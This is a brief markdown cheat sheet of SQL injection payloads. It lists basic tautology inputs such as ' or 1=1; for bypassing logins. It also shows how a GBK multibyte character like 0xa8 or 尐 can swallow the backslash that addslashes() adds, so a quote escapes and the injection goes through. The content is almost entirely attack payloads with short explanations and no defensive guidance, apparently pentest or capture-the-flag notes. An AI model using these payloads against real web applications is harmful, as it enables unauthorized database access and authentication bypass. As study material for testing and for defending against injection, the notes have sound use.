# SQL Injection

## Basic

```sql
' or 1=1;
```

```sql
' or ( 1=1 and username='admin');
```

## GBK Charset

- Simplified Chinese charset that has some mutibytes characters ending with `0x5c` (**\\**)
- This can be used if the server uses (`addslashes()`) to escape **'** at the end of user inputs

- ╘ is `a85c`
- \- is `a95c` 
- 乗 is `815c`

Giving as input
```sql
0xa8' OR 1=1; #
```
When escaped gives
```sql
0xa80x5c' OR 1=1; #
```
```sql
╘' OR 1=1; #
```
If the server expects valid GBK chars this may not work, a valid char must be giving
```sql
尐' OR 1=1 ; #
```
> 尐 is `0x8c0xa8`

when escaped
```sql
0x8c0xa80x5c' OR 1=1; #
```
```sql
0x8c╘' OR 1=1; #
```